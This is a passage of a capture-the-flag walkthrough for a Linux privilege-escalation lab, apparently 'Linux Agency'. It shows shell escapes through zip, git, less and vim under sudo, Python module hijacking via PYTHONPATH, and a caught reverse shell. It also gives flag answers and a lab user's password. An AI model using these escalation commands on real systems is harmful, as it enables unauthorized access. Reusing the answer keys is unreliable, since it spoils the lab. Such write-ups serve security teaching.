            <text:p text:style-name="Preformatted_20_Text">dalia@linuxagency:~$ sudo -u silvio zip $TF /etc/hosts -T -TT 'bash #'</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>adding: etc/hosts (deflated 37%)</text:p>
            <text:p text:style-name="Preformatted_20_Text">id</text:p>
            <text:p text:style-name="Preformatted_20_Text">uid=1032(silvio) gid=1032(silvio) groups=1032(silvio)</text:p>
            <text:p text:style-name="Preformatted_20_Text">cat /home/silvio/flag.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">python3 -c 'import pty;pty.spawn("/bin/bash")'</text:p>
            <text:p text:style-name="Preformatted_20_Text">bash: /home/dalia/.bashrc: Permission denied</text:p>
            <text:p text:style-name="Preformatted_20_Text">silvio@linuxagency:/home/silvio$</text:p>
            <text:p text:style-name="Preformatted_20_Text">silvio@linuxagency:/home/silvio$ export TERM=xterm</text:p>
            <text:p text:style-name="Preformatted_20_Text">silvio@linuxagency:/home/silvio$ export SHELL=bash</text:p>
            <text:p text:style-name="Preformatted_20_Text">silvio@linuxagency:/home/silvio$ ^Z</text:p>
            <text:p text:style-name="Preformatted_20_Text">[1]+ <text:s/>Stopped <text:s text:c="16"/>netcat -nlp 9999</text:p>
            <text:p text:style-name="Preformatted_20_Text">viktor@linuxagency:~$ stty raw -echo</text:p>
            <text:p text:style-name="Preformatted_20_Text">viktor@linuxagency:~$ fg</text:p>
            <text:p text:style-name="P1">silvio@linuxagency:/home/silvio$ export HOME=/home/silvio</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is reza's flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">reza{2f1901644eda75306f3142d837b80d3e}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">silvio can execute <text:span text:style-name="Source_20_Text">git</text:span> as reza:</text:p>
      <table:table table:name="Table50" table:style-name="Table50">
        <table:table-column table:style-name="Table50.A"/>
        <table:table-column table:style-name="Table50.B"/>
        <table:table-row table:style-name="TableLine94402688171424">
          <table:table-cell table:style-name="Table50.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="P1">7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table50.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">silvio@linuxagency:~$ sudo -l</text:p>
            <text:p text:style-name="Preformatted_20_Text">Matching Defaults entries for silvio on localhost:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>env_reset, env_file=/etc/sudoenv, mail_badpass,</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</text:p>
            <text:p text:style-name="Preformatted_20_Text">User silvio may run the following commands on localhost:</text:p>
            <text:p text:style-name="P1"><text:s text:c="4"/>(reza) SETENV: NOPASSWD: /usr/bin/git</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Let's see what we can do:</text:p>
      <table:table table:name="Table51" table:style-name="Table51">
        <table:table-column table:style-name="Table51.A"/>
        <table:table-column table:style-name="Table51.B"/>
        <table:table-row table:style-name="TableLine94402689704784">
          <table:table-cell table:style-name="Table51.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>11</text:p>
            <text:p text:style-name="Preformatted_20_Text">12</text:p>
            <text:p text:style-name="Preformatted_20_Text">13</text:p>
            <text:p text:style-name="Preformatted_20_Text">14</text:p>
            <text:p text:style-name="Preformatted_20_Text">15</text:p>
            <text:p text:style-name="Preformatted_20_Text">16</text:p>
            <text:p text:style-name="Preformatted_20_Text">17</text:p>
            <text:p text:style-name="Preformatted_20_Text">18</text:p>
            <text:p text:style-name="Preformatted_20_Text">19</text:p>
            <text:p text:style-name="Preformatted_20_Text">20</text:p>
            <text:p text:style-name="Preformatted_20_Text">21</text:p>
            <text:p text:style-name="Preformatted_20_Text">22</text:p>
            <text:p text:style-name="Preformatted_20_Text">23</text:p>
            <text:p text:style-name="Preformatted_20_Text">24</text:p>
            <text:p text:style-name="Preformatted_20_Text">25</text:p>
            <text:p text:style-name="Preformatted_20_Text">26</text:p>
            <text:p text:style-name="Preformatted_20_Text">27</text:p>
            <text:p text:style-name="Preformatted_20_Text">28</text:p>
            <text:p text:style-name="Preformatted_20_Text">29</text:p>
            <text:p text:style-name="Preformatted_20_Text">30</text:p>
            <text:p text:style-name="Preformatted_20_Text">31</text:p>
            <text:p text:style-name="Preformatted_20_Text">32</text:p>
            <text:p text:style-name="Preformatted_20_Text">33</text:p>
            <text:p text:style-name="Preformatted_20_Text">34</text:p>
            <text:p text:style-name="P1">35</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table51.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ gtfoblookup linux sudo git</text:p>
            <text:p text:style-name="Preformatted_20_Text">git:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>sudo:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Code: sudo PAGER='sh -c "exec sh 0&lt;&amp;1"' git -p help</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Description: This invokes the default pager, which is likely to</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="21"/>be [`less`](/gtfobins/less/), other functions may apply.</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Code: sudo git -p help config</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="14"/>!/bin/sh</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Description: The help system can also be reached from any `git`</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="21"/>command, e.g., `git branch`. This invokes the default</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="21"/>pager, which is likely to be [`less`](/gtfobins/less/),</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="21"/>other functions may apply.</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Code: sudo git branch --help config</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="14"/>!/bin/sh</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Description: Git hooks are merely shell scripts and in the</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="21"/>following example the hook associated to the `pre-commit`</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="21"/>action is used. Any other hook will work, just make sure to</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="21"/>be able perform the proper action to trigger it. An</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="21"/>existing repository can also be used and moving into the</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="21"/>directory works too, i.e., instead of using the `-C`</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="21"/>option.</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Code: TF=$(mktemp -d)</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="14"/>git init "$TF"</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="14"/>echo 'exec /bin/sh 0&lt;&amp;2 1&gt;&amp;2' &gt;"$TF/.git/hooks/pre-commit.sample"</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="14"/>mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="14"/>sudo git -C "$TF" commit --allow-empty -m x</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Code: TF=$(mktemp -d)</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="14"/>ln -s /bin/sh "$TF/git-x"</text:p>
            <text:p text:style-name="P1"><text:s text:c="14"/>sudo git "--exec-path=$TF" x</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">So let's use the 1st method:</text:p>
      <table:table table:name="Table52" table:style-name="Table52">
        <table:table-column table:style-name="Table52.A"/>
        <table:table-column table:style-name="Table52.B"/>
        <table:table-row table:style-name="TableLine94402689704512">
          <table:table-cell table:style-name="Table52.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="P1">6</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table52.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">silvio@linuxagency:~$ sudo -u reza PAGER='sh -c "exec sh 0&lt;&amp;1"' git -p help</text:p>
            <text:p text:style-name="Preformatted_20_Text">$ id</text:p>
            <text:p text:style-name="Preformatted_20_Text">uid=1033(reza) gid=1033(reza) groups=1033(reza)</text:p>
            <text:p text:style-name="Preformatted_20_Text">$ export HOME=/home/reza</text:p>
            <text:p text:style-name="Preformatted_20_Text">$ cd</text:p>
            <text:p text:style-name="P1">$ cat flag.txt</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is jordan's flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">jordan{fcbc4b3c31c9b58289b3946978f9e3c3}</text:span> </text:p>
      <table:table table:name="Table53" table:style-name="Table53">
        <table:table-column table:style-name="Table53.A"/>
        <table:table-column table:style-name="Table53.B"/>
        <table:table-row table:style-name="TableLine94402686325088">
          <table:table-cell table:style-name="Table53.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="P1">7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table53.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ sudo -l</text:p>
            <text:p text:style-name="Preformatted_20_Text">Matching Defaults entries for reza on localhost:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>env_reset, env_file=/etc/sudoenv, mail_badpass,</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</text:p>
            <text:p text:style-name="Preformatted_20_Text">User reza may run the following commands on localhost:</text:p>
            <text:p text:style-name="P1"><text:s text:c="4"/>(jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">We don't have the permission to read the script. But by executing it we can see it tries to load a module that is not there:</text:p>
      <table:table table:name="Table54" table:style-name="Table54">
        <table:table-column table:style-name="Table54.A"/>
        <table:table-column table:style-name="Table54.B"/>
        <table:table-row table:style-name="TableLine94402689803008">
          <table:table-cell table:style-name="Table54.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="P1">5</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table54.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ sudo -u jordan /opt/scripts/Gun-Shop.py</text:p>
            <text:p text:style-name="Preformatted_20_Text">Traceback (most recent call last):</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>File "/opt/scripts/Gun-Shop.py", line 2, in &lt;module&gt;</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>import shop</text:p>
            <text:p text:style-name="P1">ModuleNotFoundError: No module named 'shop'</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">From sudo man page:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:s/>-l, --list <text:s/>If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by </text:span><text:soft-page-break/><text:span text:style-name="Source_20_Text">the -U option) on the current host. <text:s/>A longer list format is used if this option is specified</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:s text:c="12"/>multiple times and the security policy supports a verbose output format.</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:s text:c="12"/>If a command is specified and is permitted by the security policy, the fully-qualified path to the command is displayed along with any command line arguments. <text:s/>If a command is specified but not allowed by the pol‐</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:s text:c="12"/>icy, sudo will exit with a status value of 1.</text:span></text:p>
      <text:p text:style-name="Text_20_body">Using two times the <text:span text:style-name="Source_20_Text">-l</text:span> option we obtain the advaced policy details:</text:p>
      <table:table table:name="Table55" table:style-name="Table55">
        <table:table-column table:style-name="Table55.A"/>
        <table:table-column table:style-name="Table55.B"/>
        <table:table-row table:style-name="TableLine94402688711568">
          <table:table-cell table:style-name="Table55.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text">12</text:p>
            <text:p text:style-name="P1">13</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table55.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ sudo -ll</text:p>
            <text:p text:style-name="Preformatted_20_Text">sudo -ll</text:p>
            <text:p text:style-name="Preformatted_20_Text">Matching Defaults entries for reza on linuxagency:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>env_reset, env_file=/etc/sudoenv, mail_badpass,</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</text:p>
            <text:p text:style-name="Preformatted_20_Text">User reza may run the following commands on linuxagency:</text:p>
            <text:p text:style-name="Preformatted_20_Text">Sudoers entry:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>RunAsUsers: jordan</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Options: setenv, !authenticate</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Commands:</text:p>
            <text:p text:style-name="P1"><text:s text:c="8"/>/opt/scripts/Gun-Shop.py</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">We can see the option <text:span text:style-name="Source_20_Text">setenv</text:span> that allow us to set envrionement variables, so we can set one to specify the python PATH.</text:p>
      <table:table table:name="Table56" table:style-name="Table56">
        <table:table-column table:style-name="Table56.A"/>
        <table:table-column table:style-name="Table56.B"/>
        <table:table-row table:style-name="TableLine94402689855968">
          <table:table-cell table:style-name="Table56.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="P1">6</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table56.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ mkdir -p /tmp/shop; echo 'import os; os.system("/bin/bash");' &gt; /tmp/shop/shop.py</text:p>
            <text:p text:style-name="Preformatted_20_Text">$ sudo -u jordan PYTHONPATH=/tmp/shop/ /opt/scripts/Gun-Shop.py</text:p>
            <text:p text:style-name="Preformatted_20_Text">jordan@linuxagency:/home/silvio$ id</text:p>
            <text:p text:style-name="Preformatted_20_Text">id</text:p>
            <text:p text:style-name="Preformatted_20_Text">uid=1035(jordan) gid=1035(jordan) groups=1035(jordan)</text:p>
            <text:p text:style-name="P1">}3c3e9f8796493b98285b9c13c3b4cbcf{nadroj</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">We have to reverse the flag:</text:p>
      <table:table table:name="Table57" table:style-name="Table57">
        <table:table-column table:style-name="Table57.A"/>
        <table:table-column table:style-name="Table57.B"/>
        <table:table-row table:style-name="TableLine94402688747600">
          <table:table-cell table:style-name="Table57.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="P1">3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table57.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ irb</text:p>
            <text:p text:style-name="Preformatted_20_Text">irb(main):001:0&gt; '}3c3e9f8796493b98285b9c13c3b4cbcf{nadroj'.reverse</text:p>
            <text:p text:style-name="P1">=&gt; "jordan{edited}"</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is ken's flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">ken{4115bf456d1aaf012ed4550c418ba99f}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">jordan can run <text:span text:style-name="Source_20_Text">less</text:span> as ken, you can type <text:span text:style-name="Source_20_Text">!/bin/bash</text:span> in most tools with a pager like less.</text:p>
      <table:table table:name="Table58" table:style-name="Table58">
        <table:table-column table:style-name="Table58.A"/>
        <table:table-column table:style-name="Table58.B"/>
        <table:table-row table:style-name="TableLine94402688769808">
          <table:table-cell table:style-name="Table58.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>12</text:p>
            <text:p text:style-name="Preformatted_20_Text">13</text:p>
            <text:p text:style-name="Preformatted_20_Text">14</text:p>
            <text:p text:style-name="Preformatted_20_Text">15</text:p>
            <text:p text:style-name="Preformatted_20_Text">16</text:p>
            <text:p text:style-name="P1">17</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table58.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">jordan@linuxagency:~$ sudo -l</text:p>
            <text:p text:style-name="Preformatted_20_Text">Matching Defaults entries for jordan on linuxagency:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>env_reset, env_file=/etc/sudoenv, mail_badpass,</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</text:p>
            <text:p text:style-name="Preformatted_20_Text">User jordan may run the following commands on linuxagency:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>(ken) NOPASSWD: /usr/bin/less</text:p>
            <text:p text:style-name="Preformatted_20_Text">jordan@linuxagency:~$ <text:s/>sudo -u ken /usr/bin/less /etc/os-release</text:p>
            <text:p text:style-name="Preformatted_20_Text">ken@linuxagency:/home/jordan$ cd</text:p>
            <text:p text:style-name="Preformatted_20_Text">ken@linuxagency:~$ id</text:p>
            <text:p text:style-name="Preformatted_20_Text">uid=1036(ken) gid=1036(ken) groups=1036(ken)</text:p>
            <text:p text:style-name="Preformatted_20_Text">ken@linuxagency:~$ cat flag.txt</text:p>
            <text:p text:style-name="P1"><text:soft-page-break/>ken{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is sean's flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">sean{4c5685f4db7966a43cf8e95859801281}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">ken can run <text:span text:style-name="Source_20_Text">vim</text:span> as sean, the escape tricks is nearly the same, launch vim and type <text:span text:style-name="Source_20_Text">:!/bin/bash</text:span>:</text:p>
      <table:table table:name="Table59" table:style-name="Table59">
        <table:table-column table:style-name="Table59.A"/>
        <table:table-column table:style-name="Table59.B"/>
        <table:table-row table:style-name="TableLine94402688792736">
          <table:table-cell table:style-name="Table59.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="P1">12</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table59.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">ken@linuxagency:~$ sudo -l</text:p>
            <text:p text:style-name="Preformatted_20_Text">Matching Defaults entries for ken on linuxagency:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>env_reset, env_file=/etc/sudoenv, mail_badpass,</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</text:p>
            <text:p text:style-name="Preformatted_20_Text">User ken may run the following commands on linuxagency:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>(sean) NOPASSWD: /usr/bin/vim</text:p>
            <text:p text:style-name="Preformatted_20_Text">ken@linuxagency:~$ sudo -u sean vim</text:p>
            <text:p text:style-name="Preformatted_20_Text">sean@linuxagency:~$ id</text:p>
            <text:p text:style-name="P1">uid=1037(sean) gid=1037(sean) groups=1037(sean),4(adm)</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Source_20_Text">sean</text:span> is in the <text:span text:style-name="Source_20_Text">adm</text:span> group so he can read <text:span text:style-name="Source_20_Text">/var/log</text:span>:</text:p>
      <table:table table:name="Table60" table:style-name="Table60">
        <table:table-column table:style-name="Table60.A"/>
        <table:table-column table:style-name="Table60.B"/>
        <table:table-row table:style-name="TableLine94402688805712">
          <table:table-cell table:style-name="Table60.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="P1">5</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table60.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">sean@linuxagency:~$ grep -r 'sean{' /var/log 2&gt;/dev/null</text:p>
            <text:p text:style-name="Preformatted_20_Text">/var/log/syslog.bak:Jan 12 02:58:58 ubuntu kernel: [ <text:s text:c="3"/>0.000000] ACPI: LAPIC_NMI (acpi_id[0x6d] high edge lint[0x1]) : sean{edited} VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==</text:p>
            <text:p text:style-name="Preformatted_20_Text">sean@linuxagency:~$ printf %s 'VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==' | base64 -d</text:p>
            <text:p text:style-name="P1">The password of penelope is edited</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">We obtained the flag +the password of next user as a waypoint.</text:p>
      <text:p text:style-name="Text_20_body">The password of penelope is p3nelope </text:p>
      <text:p text:style-name="Quotations">What is penelope's flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">penelope{2da1c2e9d2bd0004556ae9e107c1d222}</text:span> </text:p>
      <table:table table:name="Table61" table:style-name="Table61">
        <table:table-column table:style-name="Table61.A"/>
        <table:table-column table:style-name="Table61.B"/>
        <table:table-row table:style-name="TableLine94402688818640">
          <table:table-cell table:style-name="Table61.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="P1">10</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table61.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">sean@linuxagency:~$ su penelope</text:p>
            <text:p text:style-name="Preformatted_20_Text">Password:</text:p>
            <text:p text:style-name="Preformatted_20_Text">penelope@linuxagency:/home/sean$ cd</text:p>
            <text:p text:style-name="Preformatted_20_Text">penelope@linuxagency:~$ id</text:p>
            <text:p text:style-name="Preformatted_20_Text">uid=1038(penelope) gid=1038(penelope) groups=1038(penelope)</text:p>
            <text:p text:style-name="Preformatted_20_Text">penelope@linuxagency:~$ cat flag.txt</text:p>
            <text:p text:style-name="P1">penelope{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is maya's flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">maya{a66e159374b98f64f89f7c8d458ebb2b}</text:span> </text:p>
      <table:table table:name="Table62" table:style-name="Table62">
        <table:table-column table:style-name="Table62.A"/>
        <table:table-column table:style-name="Table62.B"/>
        <table:table-row table:style-name="TableLine94402688841488">
          <table:table-cell table:style-name="Table62.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="P1">11</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table62.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">penelope@linuxagency:~$ ls -lhA</text:p>
            <text:p text:style-name="Preformatted_20_Text">ls -lhA</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>total 72K</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rwsr-sr-x 1 maya <text:s text:c="4"/>maya <text:s text:c="5"/>39K Jan 12 04:02 base64</text:p>
